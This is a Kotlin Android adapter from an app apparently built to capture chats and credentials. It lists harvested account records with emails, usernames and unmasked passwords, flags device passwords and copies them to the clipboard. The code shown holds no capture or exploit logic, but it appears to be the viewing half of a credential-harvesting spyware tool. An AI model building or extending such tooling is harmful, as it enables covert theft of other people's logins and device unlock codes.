package com.chats.capture.ui.adapters

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import android.widget.Toast
import androidx.recyclerview.widget.DiffUtil
import androidx.recyclerview.widget.ListAdapter
import androidx.recyclerview.widget.RecyclerView
import com.chats.capture.R
import com.chats.capture.models.Credential
import com.google.android.material.snackbar.Snackbar
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CredentialsAdapter : ListAdapter<Credential, CredentialsAdapter.CredentialViewHolder>(CredentialDiffCallback()) {
    
    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): CredentialViewHolder {
        val view = LayoutInflater.from(parent.context).inflate(R.layout.item_credential, parent, false)
        return CredentialViewHolder(view)
    }
    
    override fun onBindViewHolder(holder: CredentialViewHolder, position: Int) {
        holder.bind(getItem(position))
    }
    
    class CredentialViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) {
        private val accountTypeTextView: TextView = itemView.findViewById(R.id.accountTypeTextView)
        private val appNameTextView: TextView = itemView.findViewById(R.id.appNameTextView)
        private val emailTextView: TextView = itemView.findViewById(R.id.emailTextView)
        private val usernameTextView: TextView = itemView.findViewById(R.id.usernameTextView)
        private val passwordTextView: TextView = itemView.findViewById(R.id.passwordTextView)
        private val domainTextView: TextView = itemView.findViewById(R.id.domainTextView)
        private val timestampTextView: TextView = itemView.findViewById(R.id.timestampTextView)
        
        fun bind(credential: Credential) {
            accountTypeTextView.text = "Type: ${credential.accountType.name}"
            appNameTextView.text = credential.appName ?: credential.appPackage ?: "Unknown App"
            emailTextView.text = "Email: ${credential.email ?: "N/A"}"
            usernameTextView.text = "Username: ${credential.username ?: "N/A"}"
            // Display password as plain text (not masked) - this is intentional
            passwordTextView.text = "Password: ${credential.password}"
            domainTextView.text = "Domain: ${credential.domain ?: credential.url ?: "N/A"}"
            
            val dateFormat = SimpleDateFormat("MMM dd, yyyy HH:mm:ss", Locale.getDefault())
            timestampTextView.text = dateFormat.format(Date(credential.timestamp))
            
            // Highlight device passwords
            val context = itemView.context
            if (credential.devicePassword) {
                accountTypeTextView.setTextColor(context.getColor(android.R.color.holo_red_dark))
            } else {
                // Use theme-aware text color
                val typedArray = context.obtainStyledAttributes(intArrayOf(android.R.attr.textColorPrimary))
                accountTypeTextView.setTextColor(typedArray.getColor(0, 0xFF000000.toInt()))
                typedArray.recycle()
            }
            
            // Add click listeners for copying to clipboard
            passwordTextView.setOnClickListener {
                copyToClipboard(itemView.context, credential.password, "Password")
            }
            
            emailTextView.setOnClickListener {
                credential.email?.let { email ->
                    copyToClipboard(itemView.context, email, "Email")
                }
            }
            
            usernameTextView.setOnClickListener {
                credential.username?.let { username ->
                    copyToClipboard(itemView.context, username, "Username")
                }
            }
            
            // Long press on card to copy all credential info
            itemView.setOnLongClickListener {
                val credentialText = buildString {
                    append("Type: ${credential.accountType.name}\n")
                    append("App: ${credential.appName ?: credential.appPackage ?: "N/A"}\n")
                    credential.email?.let { append("Email: $it\n") }
                    credential.username?.let { append("Username: $it\n") }
                    append("Password: ${credential.password}\n")
                    credential.domain?.let { append("Domain: $it\n") }
                    credential.url?.let { append("URL: $it\n") }
                    append("Time: ${dateFormat.format(Date(credential.timestamp))}")
                }
                copyToClipboard(itemView.context, credentialText, "Credential")
                true
            }
        }
        
        private fun copyToClipboard(context: Context, text: String, label: String) {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = ClipData.newPlainText(label, text)
            clipboard.setPrimaryClip(clip)
            Snackbar.make(itemView, "$label copied to clipboard", Snackbar.LENGTH_SHORT).show()
        }
    }
    
    private class CredentialDiffCallback : DiffUtil.ItemCallback<Credential>() {
        override fun areItemsTheSame(oldItem: Credential, newItem: Credential): Boolean {
            return oldItem.id == newItem.id
        }
        
        override fun areContentsTheSame(oldItem: Credential, newItem: Credential): Boolean {
            return oldItem == newItem
        }
    }
}
